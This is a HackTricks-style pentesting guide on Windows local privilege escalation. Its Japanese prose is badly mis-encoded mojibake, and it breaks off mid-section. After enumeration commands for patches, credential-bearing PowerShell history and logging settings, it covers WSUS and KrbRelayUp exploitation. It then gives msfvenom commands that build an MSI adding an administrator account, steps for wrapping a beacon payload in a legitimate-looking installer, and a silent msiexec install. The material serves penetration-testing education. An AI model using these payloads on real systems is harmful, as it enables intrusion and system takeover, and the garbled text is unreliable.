# Windowsãƒ­ãƒ¼ã‚«ãƒ«ç‰¹æ¨©æ˜‡æ ¼

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¾ã™
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã™
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€**[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

### **Windowsãƒ­ãƒ¼ã‚«ãƒ«ç‰¹æ¨©æ˜‡æ ¼ãƒ™ã‚¯ã‚¿ãƒ¼ã‚’æ¢ã™ãŸã‚ã®æœ€é©ãªãƒ„ãƒ¼ãƒ«:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## åˆæœŸã®Windowsç†è«–

### ã‚¢ã‚¯ã‚»ã‚¹ ãƒˆãƒ¼ã‚¯ãƒ³

**Windowsã‚¢ã‚¯ã‚»ã‚¹ ãƒˆãƒ¼ã‚¯ãƒ³ãŒä½•ã‹ã‚ã‹ã‚‰ãªã„å ´åˆã¯ã€ç¶šè¡Œã™ã‚‹å‰ã«æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’èª­ã‚“ã§ãã ã•ã„:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEsã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã«ã¤ã„ã¦ã¯ã€æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### å®Œå…¨æ€§ãƒ¬ãƒ™ãƒ«

**Windowsã®å®Œå…¨æ€§ãƒ¬ãƒ™ãƒ«ãŒã‚ã‹ã‚‰ãªã„å ´åˆã¯ã€ç¶šè¡Œã™ã‚‹å‰ã«æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’èª­ã‚“ã§ãã ã•ã„:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windowsã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«

Windowsã«ã¯ã€**ã‚·ã‚¹ãƒ†ãƒ ã®åˆ—æŒ™ã‚’é˜²ã**ã€å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®Ÿè¡Œã—ãŸã‚Šã€**æ´»å‹•ã‚’æ¤œå‡ºã™ã‚‹**ã“ã¨ãŒã§ãã‚‹ã•ã¾ã–ã¾ãªè¦ç´ ãŒã‚ã‚Šã¾ã™ã€‚ç‰¹æ¨©æ˜‡æ ¼ã®åˆ—æŒ™ã‚’é–‹å§‹ã™ã‚‹å‰ã«ã€æ¬¡ã®**ãƒšãƒ¼ã‚¸**ã‚’**èª­ã‚“ã§**ã“ã‚Œã‚‰ã®**é˜²å¾¡ãƒ¡ã‚«ãƒ‹ã‚ºãƒ **ã‚’ã™ã¹ã¦**åˆ—æŒ™**ã—ã¦ãã ã•ã„:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## ã‚·ã‚¹ãƒ†ãƒ æƒ…å ±

### ãƒãƒ¼ã‚¸ãƒ§ãƒ³æƒ…å ±ã®åˆ—æŒ™

Windowsãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«æ—¢çŸ¥ã®è„†å¼±æ€§ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼ˆé©ç”¨ã•ã‚ŒãŸãƒ‘ãƒƒãƒã‚‚ç¢ºèªã—ã¦ãã ã•ã„ï¼‰ã€‚
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®è„†å¼±æ€§

ã“ã®[ã‚µã‚¤ãƒˆ](https://msrc.microsoft.com/update-guide/vulnerability)ã¯ã€Microsoftã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’æ¤œç´¢ã™ã‚‹ã®ã«ä¾¿åˆ©ã§ã™ã€‚ã“ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã¯4,700ä»¥ä¸Šã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ãŒã‚ã‚Šã€Windowsç’°å¢ƒãŒæç¤ºã™ã‚‹**è†¨å¤§ãªæ”»æ’ƒé¢**ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚

**ã‚·ã‚¹ãƒ†ãƒ ä¸Š**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasã«watsonãŒçµ„ã¿è¾¼ã¾ã‚Œã¦ã„ã¾ã™)_

**ã‚·ã‚¹ãƒ†ãƒ æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ãƒ­ãƒ¼ã‚«ãƒ«ã§**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploitã®Githubãƒªãƒã‚¸ãƒˆãƒª:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### ç’°å¢ƒ

ç’°å¢ƒå¤‰æ•°ã«ä¿å­˜ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±/é‡è¦æƒ…å ±ã¯ã‚ã‚Šã¾ã™ã‹ï¼Ÿ
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell ã®å±¥æ­´
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell ãƒˆãƒ©ãƒ³ã‚¹ã‚¯ãƒªãƒ—ãƒˆãƒ•ã‚¡ã‚¤ãƒ«

ã“ã‚Œã‚’æœ‰åŠ¹ã«ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)ã§å­¦ã¶ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShellãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ãƒ­ã‚®ãƒ³ã‚°

PowerShellãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®å®Ÿè¡Œã®è©³ç´°ãŒè¨˜éŒ²ã•ã‚Œã€å®Ÿè¡Œã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ã€ã‚³ãƒãƒ³ãƒ‰ã®å‘¼ã³å‡ºã—ã€ãŠã‚ˆã³ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ä¸€éƒ¨ãŒå«ã¾ã‚Œã¾ã™ã€‚ãŸã ã—ã€å®Œå…¨ãªå®Ÿè¡Œã®è©³ç´°ã¨å‡ºåŠ›çµæœãŒã‚­ãƒ£ãƒ—ãƒãƒ£ã•ã‚Œãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã‚’æœ‰åŠ¹ã«ã™ã‚‹ã«ã¯ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®ã€ŒTranscript filesã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®æ‰‹é †ã«å¾“ã„ã€**ã€ŒPowershell Transcriptionã€**ã®ä»£ã‚ã‚Šã«**ã€Œãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ãƒ­ã‚®ãƒ³ã‚°ã€**ã‚’é¸æŠã—ã¦ãã ã•ã„ã€‚
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
æœ€å¾Œã®15ä»¶ã®PowersShellãƒ­ã‚°ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **ã‚¹ã‚¯ãƒªãƒ—ãƒˆãƒ–ãƒ­ãƒƒã‚¯ã®ãƒ­ã‚®ãƒ³ã‚°**

ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã®å®Œå…¨ãªã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã¨å†…å®¹ã®è¨˜éŒ²ãŒã‚­ãƒ£ãƒ—ãƒãƒ£ã•ã‚Œã€ã‚³ãƒ¼ãƒ‰ã®å„ãƒ–ãƒ­ãƒƒã‚¯ãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã³ã«ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆåŒ–ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚ˆã‚Šã€å„ã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã®åŒ…æ‹¬çš„ãªç›£æŸ»ãƒˆãƒ¬ã‚¤ãƒ«ãŒä¿å­˜ã•ã‚Œã€ãƒ•ã‚©ãƒ¬ãƒ³ã‚¸ãƒƒã‚¯ã‚„æ‚ªæ„ã®ã‚ã‚‹å‹•ä½œã®åˆ†æã«å½¹ç«‹ã¡ã¾ã™ã€‚å®Ÿè¡Œæ™‚ã«ã™ã¹ã¦ã®ã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚’æ–‡æ›¸åŒ–ã™ã‚‹ã“ã¨ã§ã€ãƒ—ãƒ­ã‚»ã‚¹ã«é–¢ã™ã‚‹è©³ç´°ãªæ´å¯ŸãŒæä¾›ã•ã‚Œã¾ã™ã€‚
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
ã‚¹ã‚¯ãƒªãƒ—ãƒˆãƒ–ãƒ­ãƒƒã‚¯ã®ãƒ­ã‚°ã‚¤ãƒ™ãƒ³ãƒˆã¯ã€Windowsã‚¤ãƒ™ãƒ³ãƒˆãƒ“ãƒ¥ãƒ¼ã‚¢ãƒ¼å†…ã®ãƒ‘ã‚¹ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™: **ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã‚µãƒ¼ãƒ“ã‚¹ã®ãƒ­ã‚° > Microsoft > Windows > PowerShell > Operational**ã€‚\
æœ€å¾Œã®20ã‚¤ãƒ™ãƒ³ãƒˆã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯æ¬¡ã‚’ä½¿ç”¨ã—ã¾ã™:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆè¨­å®š
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ãƒ‰ãƒ©ã‚¤ãƒ–
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

ã‚·ã‚¹ãƒ†ãƒ ãŒhttp**S**ã§ã¯ãªãhttpã‚’ä½¿ç”¨ã—ã¦æ›´æ–°ã‚’è¦æ±‚ã—ã¦ã„ãªã„å ´åˆã€ã‚·ã‚¹ãƒ†ãƒ ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãŒéSSL WSUSæ›´æ–°ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
ã‚‚ã—æ¬¡ã®ã‚ˆã†ãªè¿”ä¿¡ã‚’å—ã‘å–ã£ãŸå ´åˆ:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorerâ€™s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current userâ€™s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current userâ€™s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
### PowerUP

ãƒ¡ãƒ¼ã‚¿ãƒ—ãƒªã‚¿ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒã‚ã‚‹å ´åˆã€ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«**`exploit/windows/local/always_install_elevated`**ã‚’ä½¿ç”¨ã—ã¦ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’è‡ªå‹•åŒ–ã§ãã¾ã™ã€‚

PowerUPã‚’ä½¿ç”¨ã—ã¦ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã«Windows MSIãƒã‚¤ãƒŠãƒªã‚’ä½œæˆã™ã‚‹ãŸã‚ã«`Write-UserAddMSI`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼/ã‚°ãƒ«ãƒ¼ãƒ—ã®è¿½åŠ ã‚’æ±‚ã‚ã‚‹äº‹å‰ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸMSIã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©ã‚’æ›¸ãå‡ºã—ã¾ã™ï¼ˆã—ãŸãŒã£ã¦ã€GUIã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ï¼‰ã€‚
```
Write-UserAddMSI
```
### ä½œæˆã—ãŸãƒã‚¤ãƒŠãƒªã‚’å®Ÿè¡Œã—ã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã¾ã™ã€‚

### MSIãƒ©ãƒƒãƒ‘ãƒ¼

ã“ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦MSIãƒ©ãƒƒãƒ‘ãƒ¼ã‚’ä½œæˆã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦å­¦ã¶ãŸã‚ã«ã€ã“ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚“ã§ãã ã•ã„ã€‚**ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚’å®Ÿè¡Œ**ã—ãŸã„å ´åˆã¯ã€"**.bat**"ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ©ãƒƒãƒ—ã§ãã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIXã‚’ä½¿ç”¨ã—ãŸMSIã®ä½œæˆ

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studioã‚’ä½¿ç”¨ã—ãŸMSIã®ä½œæˆ

* Cobalt Strikeã¾ãŸã¯Metasploitã§`C:\privesc\beacon.exe`ã«**æ–°ã—ã„Windows EXE TCPãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’ç”Ÿæˆã—ã¾ã™ã€‚
* **Visual Studio**ã‚’é–‹ãã€**æ–°ã—ã„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆ**ã‚’é¸æŠã—ã€æ¤œç´¢ãƒœãƒƒã‚¯ã‚¹ã« "installer" ã¨å…¥åŠ›ã—ã¾ã™ã€‚**Setup Wizard**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’é¸æŠã—ã¦**æ¬¡ã¸**ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚
* ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«åå‰ã‚’ä»˜ã‘ã€**AlwaysPrivesc**ã®ã‚ˆã†ãªåå‰ã‚’ä½¿ç”¨ã—ã€å ´æ‰€ã«**`C:\privesc`**ã‚’é¸æŠã—ã€**ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã¨ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’åŒã˜ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«é…ç½®**ã‚’é¸æŠã—ã€**ä½œæˆ**ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚
* **æ¬¡ã¸**ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ç¶šã‘ã€ã‚¹ãƒ†ãƒƒãƒ— 3/4ï¼ˆå«ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é¸æŠï¼‰ã«åˆ°é”ã—ã¾ã™ã€‚**è¿½åŠ **ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€ã•ãã»ã©ç”Ÿæˆã—ãŸBeaconãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚ãã®å¾Œã€**å®Œäº†**ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚
* **ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ãƒ¼ãƒ©**ã§**AlwaysPrivesc**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’å¼·èª¿è¡¨ç¤ºã—ã€**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£**ã§**TargetPlatform**ã‚’**x86**ã‹ã‚‰**x64**ã«å¤‰æ›´ã—ã¾ã™ã€‚
* ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚’ã‚ˆã‚Šåˆæ³•çš„ã«è¦‹ã›ã‚‹ã“ã¨ãŒã§ãã‚‹**Author**ã‚„**Manufacturer**ãªã©ã€ä»–ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã§ãã¾ã™ã€‚
* ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’å³ã‚¯ãƒªãƒƒã‚¯ã—ã€**è¡¨ç¤º > ã‚«ã‚¹ã‚¿ãƒ ã‚¢ã‚¯ã‚·ãƒ§ãƒ³**ã‚’é¸æŠã—ã¾ã™ã€‚
* **ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«**ã‚’å³ã‚¯ãƒªãƒƒã‚¯ã—ã€**ã‚«ã‚¹ã‚¿ãƒ ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®è¿½åŠ **ã‚’é¸æŠã—ã¾ã™ã€‚
* **Application Folder**ã‚’ãƒ€ãƒ–ãƒ«ã‚¯ãƒªãƒƒã‚¯ã—ã€**beacon.exe**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é¸æŠã—ã¦**OK**ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã™ãã«Beaconãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
* **ã‚«ã‚¹ã‚¿ãƒ ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£**ã§ã€**Run64Bit**ã‚’**True**ã«å¤‰æ›´ã—ã¾ã™ã€‚
* æœ€å¾Œã«ã€**ãƒ“ãƒ«ãƒ‰**ã—ã¾ã™ã€‚
* `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`ã¨ã„ã†è­¦å‘ŠãŒè¡¨ç¤ºã•ã‚Œã‚‹å ´åˆã¯ã€ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚’x64ã«è¨­å®šã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

### MSIã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«

æ‚ªæ„ã®ã‚ã‚‹`.msi`ãƒ•ã‚¡ã‚¤ãƒ«ã®**ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«**ã‚’**ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰**ã§å®Ÿè¡Œã™ã‚‹ã«ã¯ï¼š
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
## ç‰¹æ¨©æ˜‡æ ¼

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€_exploit/windows/local/always\_install\_elevated_ ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

## ã‚¢ãƒ³ãƒã‚¦ã‚¤ãƒ«ã‚¹ãŠã‚ˆã³æ¤œå‡ºå™¨

### ç›£æŸ»è¨­å®š

ã“ã‚Œã‚‰ã®è¨­å®šã¯ä½•ãŒ**è¨˜éŒ²**ã•ã‚Œã‚‹ã‹ã‚’æ±ºå®šã™ã‚‹ãŸã‚ã€æ³¨æ„ã‚’æ‰•ã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```
